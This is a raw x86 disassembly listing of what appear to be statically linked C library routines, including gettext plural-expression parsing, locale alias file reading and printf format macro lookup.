jmp 0x8083ce6
inc edx
movzx eax, byte [edx]
cmp al, 0x2c
je 0x8083e55
jmp 0x8083cc4
push ebp
mov ebp, esp
push edi
mov edi, ecx
push esi
push ebx
mov ebx, eax
sub esp, 0x24
test eax, eax
mov dword [var_1ch], edx
je 0x8062b68
mov dword [var_4h], str.plural
mov dword [esp], eax
call fcn.080535c0
mov dword [esp], ebx
mov dword [var_4h], str.nplurals
mov dword [var_20h], eax
call fcn.080535c0
mov ebx, eax
mov eax, dword [var_20h]
test eax, eax
je 0x8062b68
test ebx, ebx
je 0x8062b68
add ebx, 9
movzx edx, byte [ebx]
test dl, dl
je 0x8062b0c
mov eax, 0
mov esi, 0x80aad18
test eax, eax
je 0x8062af6
mov dword [esp], 4
call section.
mov esi, eax
mov ecx, dword [esi]
test ecx, ecx
je 0x8062b79
movzx edx, byte [ebx]
movzx eax, dl
test byte [ecx + eax*2 + 1], 0x20
je 0x8062b0c
inc ebx
jmp 0x8062ad3
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8062b68
lea eax, [var_10h]
mov dword [var_ch], 0
mov dword [var_8h], 0xa
mov dword [var_4h], eax
mov dword [esp], ebx
call fcn.08063780
cmp ebx, dword [var_10h]
je 0x8062b68
mov dword [edi], eax
mov eax, dword [var_20h]
add eax, 7
mov dword [var_18h], eax
lea eax, [var_18h]
mov dword [esp], eax
call fcn.08062420
test eax, eax
jne 0x8062b68
mov eax, dword [var_14h]
mov edx, dword [var_1ch]
mov dword [edx], eax
lea esi, [esi]
add esp, 0x24
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_1ch]
mov dword [edi], 2
mov dword [eax], 0x80a9b04
jmp 0x8062b60
mov eax, 0
test eax, eax
je 0x8062ba1
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [esi], eax
mov ecx, eax
jmp 0x8062afc
mov eax, dword [0x80a9ab4]
jmp 0x8062b8e
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
movzx edx, byte [eax]
cmp dl, 0x50
je 0x8060144
cmp dl, 0x49
jne 0x8060140
cmp byte [eax + 1], 0
jne 0x8060140
mov eax, 0x80a01ef
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
lea esi, [esi]
xor eax, eax
jmp 0x806012c
cmp byte [eax + 1], 0x52
jne 0x806011c
cmp byte [eax + 2], 0x49
jne 0x806011c
movzx ebx, byte [eax + 3]
cmp bl, 0x64
je 0x8060172
cmp bl, 0x69
je 0x8060172
cmp bl, 0x6f
je 0x8060172
cmp bl, 0x75
je 0x8060172
cmp bl, 0x78
je 0x8060172
cmp bl, 0x58
jne 0x806011c
movzx edi, byte [eax + 4]
mov ecx, edi
cmp cl, 0x38
je 0x8060420
mov ecx, edi
cmp cl, 0x31
je 0x8060407
mov ecx, edi
cmp cl, 0x33
je 0x80603ee
mov ecx, edi
cmp cl, 0x36
je 0x80603d5
mov ecx, edi
cmp cl, 0x4c
je 0x8060340
mov ecx, edi
cmp cl, 0x46
je 0x80602b0
mov ecx, edi
cmp cl, 0x4d
je 0x8060245
mov ecx, edi
cmp cl, 0x50
jne 0x806011c
cmp byte [eax + 5], 0x54
jne 0x806011c
cmp byte [eax + 6], 0x52
jne 0x806011c
cmp byte [eax + 7], 0
jne 0x806011c
cmp bl, 0x64
mov eax, 0x80a72a4
je 0x806012c
cmp bl, 0x69
mov eax, 0x8093538
je 0x806012c
cmp bl, 0x6f
mov eax, 0x80a3736
je 0x806012c
cmp bl, 0x75
mov eax, 0x80a7269
je 0x806012c
cmp bl, 0x78
mov eax, 0x80a3f75
je 0x806012c
mov eax, 0x80a01e4
cmp bl, 0x58
je 0x806012c
jmp 0x806042f
cmp byte [eax + 5], 0x41
jne 0x80601c3
cmp byte [eax + 6], 0x58
jne 0x80601c3
cmp byte [eax + 7], 0
jne 0x80601c3
cmp bl, 0x64
mov eax, 0x80a01f1
je 0x806012c
cmp bl, 0x69
mov eax, 0x80a01f5
je 0x806012c
cmp bl, 0x6f
mov eax, 0x80a01f9
je 0x806012c
cmp bl, 0x75
mov eax, 0x80a01fd
je 0x806012c
cmp bl, 0x78
mov eax, 0x80a0201
je 0x806012c
mov eax, 0x80a0205
jmp 0x8060237
cmp byte [eax + 5], 0x41
jne 0x80601b8
cmp byte [eax + 6], 0x53
jne 0x80601b8
cmp byte [eax + 7], 0x54
jne 0x80601b8
movzx esi, byte [eax + 8]
mov ecx, esi
cmp cl, 0x38
je 0x806032f
mov ecx, esi
cmp cl, 0x31
je 0x806031d
mov ecx, esi
cmp cl, 0x33
je 0x806030b
mov ecx, esi
cmp cl, 0x36
jne 0x80601b8
cmp byte [eax + 9], 0x34
jne 0x80601b8
cmp byte [eax + 0xa], 0
je 0x8060263
jmp 0x80601b8
cmp byte [eax + 9], 0x32
jne 0x80602e7
cmp byte [eax + 0xa], 0
je 0x80601ec
jmp 0x80602e7
cmp byte [eax + 9], 0x36
jne 0x80602e0
cmp byte [eax + 0xa], 0
je 0x80601ec
jmp 0x80602e0
cmp byte [eax + 9], 0
je 0x80601ec
jmp 0x80602d9
nop
lea esi, [esi]
cmp byte [eax + 5], 0x45
jne 0x80601ad
cmp byte [eax + 6], 0x41
jne 0x80601ad
cmp byte [eax + 7], 0x53
jne 0x80601ad
cmp byte [eax + 8], 0x54
jne 0x80601ad
movzx esi, byte [eax + 9]
mov ecx, esi
cmp cl, 0x38
je 0x80603c9
mov ecx, esi
cmp cl, 0x31
je 0x80603b7
mov ecx, esi
cmp cl, 0x33
je 0x80603a5
mov ecx, esi
cmp cl, 0x36
jne 0x80601ad
cmp byte [eax + 0xa], 0x34
jne 0x80601ad
cmp byte [eax + 0xb], 0
je 0x8060263
jmp 0x80601ad
cmp byte [eax + 0xa], 0x32
jne 0x8060381
cmp byte [eax + 0xb], 0
je 0x80601ec
jmp 0x8060381
cmp byte [eax + 0xa], 0x36
jne 0x806037a
cmp byte [eax + 0xb], 0
je 0x80601ec
jmp 0x806037a
cmp byte [eax + 0xa], 0
je 0x80601ec
jmp 0x8060373
cmp byte [eax + 5], 0x34
jne 0x80601a2
cmp byte [eax + 6], 0
je 0x8060263
jmp 0x80601a2
cmp byte [eax + 5], 0x32
jne 0x8060197
cmp byte [eax + 6], 0
je 0x80601ec
jmp 0x8060197
cmp byte [eax + 5], 0x36
jne 0x806018c
cmp byte [eax + 6], 0
je 0x80601ec
jmp 0x806018c
cmp byte [eax + 5], 0
je 0x80601ec
jmp 0x8060181
call fcn.08062c50
lea esi, [esi]
lea edi, [edi]
push ebp
lea ecx, [edx + 0x20]
mov ebp, esp
and ecx, 0xfffffffc
push edi
push esi
push ebx
sub esp, 0x1c4
sub esp, ecx
lea ebx, [var_1fh]
mov dword [var_8h], edx
mov dword [var_4h], eax
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov dword [var_4h], str._locale.alias
mov dword [var_8h], 0xe
mov dword [esp], eax
call fcn.08053740
mov dword [var_4h], 0x8093820
mov dword [esp], ebx
call fcn.0804a250
xor edx, edx
mov dword [var_1a0h], eax
test eax, eax
je 0x8061909
mov dword [var_4h], 2
mov dword [esp], eax
call fcn.08076c00
mov edx, dword [var_1a0h]
mov dword [var_1a4h], 0
test byte [edx], 0x10
jne 0x80618eb
lea esi, [esi]
mov ecx, dword [var_1a0h]
lea eax, [var_19ch]
mov dword [var_4h], 0x190
mov dword [esp], eax
mov dword [var_8h], ecx
call fcn.08076c40
test eax, eax
je 0x80618eb
lea edx, [var_19ch]
mov dword [var_4h], 0xa
lea esi, [var_19ch]
mov dword [esp], edx
call fcn.08076ce0
test eax, eax
setne al
movzx eax, al
mov dword [var_1a8h], eax
mov ecx, 0
mov ebx, 0x80aad18
test ecx, ecx
je 0x806168e
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8061a8e
movzx ebx, byte [esi]
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x80616a8
inc esi
jmp 0x8061672
test bl, bl
je 0x80618d2
cmp bl, 0x23
je 0x80618d2
mov dword [var_1ach], esi
nop
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x8061701
mov edx, 0
mov edi, 0x80aad18
test edx, edx
je 0x80616e4
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x8061a5c
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x80616c0
test bl, bl
je 0x8061701
mov byte [esi], 0
nop
inc esi
mov eax, 0
mov ebx, 0x80aad18
test eax, eax
je 0x806171d
mov dword [esp], 4
call section.
mov ebx, eax
mov edx, dword [ebx]
test edx, edx
je 0x8061a2d
movzx ebx, byte [esi]
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
jne 0x8061700
test bl, bl
je 0x80618d2
mov dword [var_1b4h], esi
inc esi
movzx ebx, byte [esi]
test bl, bl
je 0x806177a
mov ecx, 0
mov edi, 0x80aad18
test ecx, ecx
je 0x8061766
mov dword [esp], 4
call section.
mov edi, eax
mov edx, dword [edi]
test edx, edx
je 0x80619fb
movzx eax, bl
test byte [edx + eax*2 + 1], 0x20
je 0x8061742
cmp bl, 0xa
je 0x80619ef
test bl, bl
je 0x806178a
mov byte [esi], 0
mov eax, dword [0x80aa974]
cmp dword [0x80aa970], eax
jae 0x80619d7
mov edx, dword [var_1ach]
mov dword [esp], edx
call fcn.08053400
mov ecx, dword [var_1b4h]
lea edi, [eax + 1]
mov dword [esp], ecx
call fcn.08053400
mov ecx, dword [0x80aa96c]
mov edx, dword [0x80aa968]
inc eax
mov dword [var_1b0h], eax
lea eax, [edi + edx]
add eax, dword [var_1b0h]
cmp eax, ecx
jbe 0x80619c6
mov edx, dword [var_1b0h]
lea eax, [edx + edi]
mov edx, 0x400
cmp eax, 0x3ff
cmovbe eax, edx
add ecx, eax
mov eax, dword [section.__libc_freeres_ptrs]
mov dword [var_1b8h], ecx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.08051220
mov edx, dword [var_1a4h]
test eax, eax
mov dword [var_1c0h], eax
je 0x8061909
mov eax, dword [section.__libc_freeres_ptrs]
cmp eax, dword [var_1c0h]
jne 0x8061987
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
mov edx, dword [var_1b8h]
mov eax, dword [var_1c0h]
mov dword [0x80aa96c], edx
mov dword [section.__libc_freeres_ptrs], eax
mov edx, dword [0x80aa968]
add edx, dword [section.__libc_freeres_ptrs]
mov ecx, dword [var_1ach]
mov dword [var_8h], edi
mov dword [var_4h], ecx
mov dword [esp], edx
call fcn.08053770
mov ecx, dword [var_1b4h]
mov edx, dword [0x80aa968]
mov dword [ebx + esi*8], eax
mov eax, dword [var_1b0h]
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
mov dword [var_4h], ecx
add edx, edi
mov dword [var_8h], eax
mov dword [0x80aa968], edx
add edx, dword [section.__libc_freeres_ptrs]
mov dword [esp], edx
call fcn.08053770
inc dword [var_1a4h]
mov dword [ebx + esi*8 + 4], eax
inc dword [0x80aa970]
mov eax, dword [var_1b0h]
add dword [0x80aa968], eax
mov edx, dword [var_1a8h]
test edx, edx
je 0x8061940
mov edx, dword [var_1a0h]
test byte [edx], 0x10
je 0x8061620
mov ecx, dword [var_1a0h]
mov dword [esp], ecx
call fcn.08049dc0
mov eax, dword [var_1a4h]
test eax, eax
jne 0x8061913
mov edx, dword [var_1a4h]
lea esp, [var_ch]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80aa970]
mov dword [var_sp_ch], fcn.08061b10
mov dword [var_8h], 8
mov dword [var_4h], eax
mov eax, dword [0x80aad90]
mov dword [esp], eax
call fcn.08063070
jmp 0x8061903
nop
lea esi, [esi]
mov edx, dword [var_1a0h]
lea ecx, [var_19ch]
mov dword [var_4h], 0x190
mov dword [esp], ecx
mov dword [var_8h], edx
call fcn.08076c40
test eax, eax
je 0x80618dc
lea eax, [var_19ch]
mov dword [var_4h], 0xa
mov dword [esp], eax
call fcn.08076ce0
test eax, eax
je 0x8061940
jmp 0x80618dc
mov esi, dword [0x80aa970]
xor edx, edx
cmp edx, esi
mov dword [var_1bch], esi
jae 0x8061838
mov ebx, dword [0x80aad90]
mov ecx, dword [var_1c0h]
sub ecx, eax
add dword [ebx + edx*8 + 4], ecx
add dword [ebx + edx*8], ecx
inc edx
cmp edx, dword [var_1bch]
jae 0x806183e
mov eax, dword [section.__libc_freeres_ptrs]
jmp 0x80619a3
mov esi, dword [0x80aa970]
mov ebx, dword [0x80aad90]
jmp 0x806185b
call fcn.08061ac0
mov edx, dword [var_1a4h]
test eax, eax
je 0x806179b
jmp 0x8061909
mov byte [esi], 0
mov byte [esi + 1], 0xa
jmp 0x806178a
mov eax, 0
test eax, eax
je 0x8061a26
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi]
jmp 0x8061770
mov eax, dword [0x80a9ab4]
jmp 0x8061a10
mov edx, 0
test edx, edx
je 0x8061a55
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061727
mov eax, dword [0x80a9ab4]
jmp 0x8061a42
mov ecx, 0
test ecx, ecx
je 0x8061a87
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [edi], eax
mov edx, eax
movzx ebx, byte [esi]
jmp 0x80616ee
mov eax, dword [0x80a9ab4]
jmp 0x8061a71
mov eax, 0
test eax, eax
je 0x8061ab6
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov eax, dword [eax + 0x24]
add eax, 0x100
mov dword [ebx], eax
mov edx, eax
jmp 0x8061698
mov eax, dword [0x80a9ab4]
jmp 0x8061aa3
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [var_10h_2]
mov dword [var_10h_3], 0
cmp dword [var_10h_3], esi
jae 0x8062e86
mov ebx, dword [var_10h_3]
mov eax, dword [var_14h]
mov edi, dword [var_8h]
add ebx, esi
shr ebx, 1
imul eax, ebx
add edi, eax
mov eax, dword [var_4h]
mov dword [var_4h_2], edi
mov dword [esp], eax
call dword [var_18h]
test eax, eax
jl 0x8062e94
jle 0x8062e90
inc ebx
mov dword [var_10h_3], ebx
cmp dword [var_10h_3], esi
jb 0x8062e58
xor eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov eax, edi
jmp 0x8062e88
mov esi, ebx
jmp 0x8062e81
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x24
mov edx, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_10h]
test edx, edx
jle 0x8076cae
mov eax, dword [esi]
mov ecx, eax
and eax, 0xffffffdf
mov dword [esi], eax
and ecx, 0x20
mov dword [esp], esi
lea eax, [edx - 1]
mov dword [var_10h], ecx
mov dword [var_sp_10h], 1
mov dword [var_sp_8h], eax
mov dword [var_sp_ch], 0xa
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
call fcn.0808db00
test eax, eax
mov edi, eax
je 0x8076ccd
mov ebx, dword [esi]
test bl, 0x20
je 0x8076cc0
call fcn.08048b20
cmp dword [eax], 0xb
je 0x8076cc0
xor eax, eax
or ebx, dword [var_10h]
mov dword [esi], ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea esi, [esi]
mov ecx, dword [arg_8h]
mov byte [edi + ecx], 0
mov eax, ecx
mov ebx, dword [esi]
jmp 0x8076ca9
mov ebx, dword [esi]
jmp 0x8076ca7
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [0x80aa974]
mov dword [var_4h], ebx
mov ebx, 0x64
lea edx, [eax + eax]
test eax, eax
cmovne ebx, edx
lea eax, [ebx*8]
mov dword [var_sp_4h], eax
mov eax, dword [0x80aad90]
mov dword [esp], eax
call fcn.08051220
mov edx, 0xffffffff
test eax, eax
je 0x8061b09
mov dword [0x80aad90], eax
mov dword [0x80aa974], ebx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 8
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80775f3
mov dword [var_4h], ebx
mov dword [esp], esi
call fcn.08076f30
sub ebx, eax
add esi, eax
mov eax, ebx
dec ebx
cmp eax, 1
jbe 0x80775f3
movzx eax, byte [arg_10h]
mov byte [esi], al
inc esi
jmp 0x80775d2
add esp, 8
pop ebx
pop esi
leave
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 4
mov ebx, dword [arg_ch]
mov esi, dword [arg_8h]
test ebx, ebx
je 0x80774e7
mov dword [esp], esi
inc edi
call fcn.08053400
sub ebx, eax
lea esi, [eax + esi + 1]
dec ebx
jne 0x80774d5
add esp, 4
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
movzx edx, byte [eax]
test dl, dl
je 0x80621f7
cmp dl, 0x5f
je 0x80621f7
cmp dl, 0x40
je 0x80621f7
cmp dl, 0x2e
je 0x80621f7
lea esi, [esi]
inc eax
movzx edx, byte [eax]
test dl, dl
je 0x80621f7
cmp dl, 0x5f
je 0x80621f7
cmp dl, 0x40
je 0x80621f7
cmp dl, 0x2e
jne 0x80621e0
leave
ret
push ebp
mov ebp, esp
sub esp, 8
test eax, eax
mov dword [var_4h], ebx
mov ebx, eax
je 0x8062928
mov eax, dword [eax]
cmp eax, 2
je 0x8062944
jg 0x8062937
dec eax
je 0x806292d
nop
lea esi, [esi]
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_4h]
leave
ret
mov eax, dword [ebx + 8]
call fcn.08062900
jmp 0x8062920
cmp eax, 3
jne 0x8062920
mov eax, dword [ebx + 0x10]
call fcn.08062900
mov eax, dword [ebx + 0xc]
call fcn.08062900
jmp 0x806292d
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 4
mov ebx, dword [arg_8h]
mov esi, dword [arg_10h]
dec ebx
test ebx, ebx
mov edi, ebx
js 0x80623a0
mov eax, dword [esi + ebx*4]
test eax, eax
je 0x80623d7
dec ebx
jns 0x8062396
mov dword [esp], 0x14
call fcn.08050fe0
test eax, eax
mov edx, eax
je 0x80623d7
mov eax, dword [arg_8h]
test edi, edi
mov ebx, edi
mov dword [edx], eax
mov eax, dword [arg_ch]
mov dword [edx + 4], eax
js 0x80623cd
mov eax, dword [esi + ebx*4]
mov dword [edx + ebx*4 + 8], eax
dec ebx
jns 0x80623c3
mov eax, edx
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
test edi, edi
mov ebx, edi
js 0x80623eb
lea esi, [esi]
mov eax, dword [esi + ebx*4]
call fcn.08062900
dec ebx
jns 0x80623e0
xor eax, eax
jmp 0x80623cf
push ebp
mov ebp, esp
sub esp, 0x14
mov eax, dword [arg_ch]
mov dword [esp], 2
mov dword [var_8h], eax
mov eax, dword [arg_10h]
mov dword [var_4h], eax
lea eax, [var_8h]
mov dword [var_sp_8h], eax
mov eax, dword [arg_8h]
mov dword [var_sp_4h], eax
call fcn.08062380
leave
ret
push ebp
mov ebp, esp
leave
ret
push ebp
mov ebp, esp
push edi
push esi
mov edi, dword [arg_8h]
mov esi, dword [arg_ch]
push ebx
mov ecx, dword [esi]
mov esi, esi
movzx eax, byte [ecx]
test al, al
je 0x8062a59
cmp al, 0x20
je 0x8062973
cmp al, 9
jne 0x8062976
inc ecx
jmp 0x8062960
movsx edx, al
inc ecx
cmp edx, 0x7c
ja case.0x8062983.1
jmp dword [edx*4 + 0x80a0540]
movzx ebx, byte [ecx]
sub edx, 0x30
lea eax, [ebx - 0x30]
cmp al, 9
ja 0x80629ac
inc ecx
lea eax, [edx + edx*4]
movsx edx, bl
movzx ebx, byte [ecx]
lea edx, [edx + eax*2 - 0x30]
lea eax, [ebx - 0x30]
cmp al, 9
jbe 0x8062997
mov dword [edi], edx
mov edx, 0x105
mov dword [esi], ecx
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
cmp byte [ecx], 0x3d
jne case.0x8062983.40
inc ecx
mov dword [edi], 0xd
mov edx, 0x101
jmp case.0x8062983.40
mov dword [edi], 5
mov edx, 0x104
jmp case.0x8062983.40
mov dword [edi], 3
jmp 0x80629d5
mov dword [edi], 6
mov edx, 0x103
jmp case.0x8062983.40
mov dword [edi], 7
jmp 0x80629ea
mov dword [edi], 4
jmp 0x80629d5
dec ecx
xor edx, edx
jmp case.0x8062983.40
cmp byte [ecx], 0x3d
je 0x8062a18
mov dword [edi], 8
mov edx, 0x102
jmp case.0x8062983.40
inc ecx
mov dword [edi], 0xa
jmp 0x8062a11
cmp byte [ecx], 0x3d
je 0x8062a2d
mov edx, 0x100
jmp case.0x8062983.40
inc ecx
mov dword [edi], 0xc
jmp 0x80629c8
cmp byte [ecx], 0x3d
je 0x8062a43
mov dword [edi], 9
jmp 0x8062a11
inc ecx
mov dword [edi], 0xb
jmp 0x8062a11
movsx eax, byte [ecx]
cmp eax, edx
jne case.0x8062983.1
inc ecx
jmp case.0x8062983.40
xor eax, eax
mov dword [esi], ecx
jmp 0x80629b7
push ebp
mov ebp, esp
push edi
push esi
lea eax, [var_19ch]
lea edx, [var_4bch]
push ebx
mov edi, edx
mov ebx, eax
sub esp, 0x4fc
mov dword [var_4d8h], 0xfffffffe
mov dword [var_4e0h], 0
mov dword [var_4e4h], eax
mov dword [var_4e8h], edx
mov dword [var_4ech], 0xc8
mov dword [var_4dch], 0
mov ecx, dword [var_4dch]
mov edx, dword [var_4ech]
mov word [ebx], cx
add edx, edx
mov ecx, dword [var_4e4h]
lea eax, [edx + ecx - 2]
cmp ebx, eax
jb 0x8062556
sub ebx, ecx
sar ebx, 1
inc ebx
cmp dword [var_4ech], 0x270f
mov dword [var_4f4h], ebx
ja 0x80628df
cmp edx, 0x2711
mov eax, 0x2710
cmovb eax, edx
mov dword [var_4ech], eax
mov edi, dword [var_4ech]
add eax, eax
mov dword [var_4f8h], eax
add eax, edi
lea eax, [eax + eax + 0x14]
sub esp, eax
lea eax, [var_1bh]
mov esi, eax
and esi, 0xfffffff0
je 0x80628df
add ebx, ebx
mov dword [var_4h], ecx
mov dword [esp], esi
mov dword [var_8h], ebx
call fcn.08053770
mov eax, dword [var_4f4h]
mov edi, dword [var_4f8h]
mov dword [var_4e4h], esi
cld
shl eax, 2
add edi, 3
mov ecx, eax
and edi, 0xfffffffc
shr ecx, 2
add edi, esi
mov esi, dword [var_4e8h]
mov dword [var_4fch], edi
rep movsd dword es:[edi], dword ptr [esi]
mov edx, dword [var_4fch]
mov ecx, dword [var_4e4h]
lea edi, [eax + edx - 4]
mov dword [var_4e8h], edx
lea ebx, [ebx + ecx - 2]
mov edx, dword [var_4f8h]
lea eax, [edx + ecx - 2]
cmp ebx, eax
jae 0x806266f
mov ecx, dword [var_4dch]
movsx esi, word [ecx + ecx + 0x80a03e0]
cmp esi, 0xffff8000
je 0x80625bc
cmp dword [var_4d8h], 0xfffffffe
je 0x80628bf
mov eax, dword [var_4d8h]
test eax, eax
jle 0x80628ae
cmp dword [var_4d8h], 0x105
mov edx, 0x12
ja 0x80625a5
mov ecx, dword [var_4d8h]
movsx edx, byte [ecx + 0x80a0260]
add esi, edx
cmp esi, 0x35
ja 0x80625bc
movsx eax, word [esi + esi + 0x80a04a0]
cmp eax, edx
je 0x8062840
mov eax, dword [var_4dch]
movsx esi, word [eax + eax + 0x80a03a0]
test esi, esi
je 0x8062770
movsx edx, word [esi + esi + 0x80a0380]
mov eax, 1
sub eax, edx
mov dword [var_4f0h], edx
cmp esi, 0xc
mov edx, dword [edi + eax*4]
ja case.0x80625ef.0
jmp dword [esi*4 + 0x80a050c]
mov eax, dword [edi]
test eax, eax
je 0x806266f
mov ecx, dword [arg_8h]
mov dword [ecx + 4], eax
mov eax, dword [var_4f0h]
movsx esi, word [esi + esi + 0x80a0366]
shl eax, 2
sub edi, eax
mov eax, dword [var_4f0h]
add edi, 4
mov dword [edi], edx
movsx edx, word [esi + esi + 0x80a03f8]
add eax, eax
sub ebx, eax
movzx ecx, word [ebx]
movsx eax, cx
add edx, eax
cmp edx, 0x35
mov dword [var_4dch], edx
ja 0x8062649
cmp word [edx + edx + 0x80a04a0], cx
je 0x806265f
movsx esi, word [esi + esi + 0x80a03b8]
mov dword [var_4dch], esi
add ebx, 2
jmp 0x8062470
movsx eax, word [edx + edx + 0x80a0420]
mov dword [var_4dch], eax
jmp 0x8062657
mov eax, 1
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [edi - 0x10]
mov edx, dword [edi - 8]
mov ecx, dword [edi]
mov dword [esp], 3
mov dword [var_4h], 0x10
mov dword [var_4cch], eax
mov dword [var_4c8h], edx
lea eax, [var_4cch]
mov dword [var_4c4h], ecx
mov dword [var_8h], eax
call fcn.08062380
mov edx, eax
jmp case.0x80625ef.0
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [esp], 0xf
mov dword [var_4h], eax
call fcn.080623f0
jmp 0x80626b4
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [esp], 0xe
jmp 0x80626cb
mov eax, dword [edi]
mov dword [var_8h], eax
mov eax, dword [edi - 8]
mov dword [var_4h], eax
mov eax, dword [edi - 4]
mov dword [esp], eax
jmp 0x80626cf
mov eax, dword [edi]
mov dword [esp], 1
mov dword [var_4h], 2
mov dword [var_4d4h], eax
lea eax, [var_4d4h]
jmp 0x80626ab
mov dword [var_8h], 0
mov dword [var_4h], 0
mov dword [esp], 0
jmp 0x80626af
mov dword [var_8h], 0
mov dword [var_4h], 1
mov dword [esp], 0
call fcn.08062380
test eax, eax
mov edx, eax
je case.0x80625ef.0
mov eax, dword [edi]
mov dword [edx + 8], eax
jmp case.0x80625ef.0
mov edx, dword [edi - 4]
jmp case.0x80625ef.0
mov ecx, dword [var_4e0h]
test ecx, ecx
je 0x806282f
cmp dword [var_4e0h], 3
je 0x8062812
mov dword [var_4e0h], 3
mov ecx, dword [var_4dch]
movsx esi, word [ecx + ecx + 0x80a03e0]
cmp esi, 0xffff8000
je 0x80627bc
inc esi
cmp esi, 0x35
ja 0x80627bc
cmp word [esi + esi + 0x80a04a0], 1
je 0x80627d9
cmp ebx, dword [var_4e4h]
je 0x806266f
sub ebx, 2
sub edi, 4
movsx edx, word [ebx]
mov dword [var_4dch], edx
jmp 0x8062795
movsx esi, word [esi + esi + 0x80a0420]
test esi, esi
jl 0x8062803
je 0x80627bc
cmp esi, 0x1b
je 0x80627fc
mov eax, dword [var_4d0h]
add edi, 4
mov dword [edi], eax
jmp 0x8062651
xor eax, eax
jmp 0x8062674
cmp esi, 0xffff8000
je 0x80627bc
neg esi
jmp 0x80625d2
mov edx, dword [var_4d8h]
test edx, edx
je 0x806266f
mov dword [var_4d8h], 0xfffffffe
jmp 0x806278b
mov dword [esp], 0x80a0734
call fcn.08062a70
jmp 0x806277e
movsx esi, word [esi + esi + 0x80a0420]
test esi, esi
jl 0x806289d
je 0x8062770
cmp esi, 0x1b
je 0x80627fc
mov ecx, dword [var_4d8h]
mov eax, 0xfffffffe
mov edx, dword [var_4e0h]
test ecx, ecx
cmove eax, dword [var_4d8h]
add edi, 4
mov dword [var_4d8h], eax
mov eax, dword [var_4d0h]
mov dword [edi], eax
mov eax, dword [var_4e0h]
dec eax
test edx, edx
cmove eax, dword [var_4e0h]
mov dword [var_4e0h], eax
jmp 0x8062651
cmp esi, 0xffff8000
jne 0x806280b
jmp 0x8062770
xor edx, edx
mov dword [var_4d8h], 0
jmp 0x80625a5
mov eax, dword [arg_8h]
mov dword [var_4h], eax
lea eax, [var_4d0h]
mov dword [esp], eax
call fcn.08062950
mov dword [var_4d8h], eax
jmp 0x8062579
mov dword [esp], str.parser_stack_overflow
call fcn.08062a70
mov eax, 2
jmp 0x8062674
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0xc
test eax, eax
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
je 0x8084b5e
mov ebx, dword [var_4h]
leave
jmp section.
call fcn.08053db0
mov dword [var_sp_4h], ebx
mov dword [esp], eax
call fcn.08049220
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
leave
jmp 0x804e540
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push ebx
mov ecx, dword [arg_8h]
mov ebx, dword [arg_ch]
cmp word [ecx], 0
sets al
inc eax
test ebx, ebx
je 0x8076c24
mov edx, dword [ecx]
and dh, 0x7f
cmp ebx, 2
mov dword [ecx], edx
je 0x8076c29
mov ebx, dword [esp]
leave
ret
or dh, 0x80
mov dword [ecx], edx
jmp 0x8076c24
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
sub esp, 0x24
mov edx, dword [arg_ch]
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_10h]
test edx, edx
jle 0x8076cae
mov eax, dword [esi]
mov ecx, eax
and eax, 0xffffffdf
mov dword [esi], eax
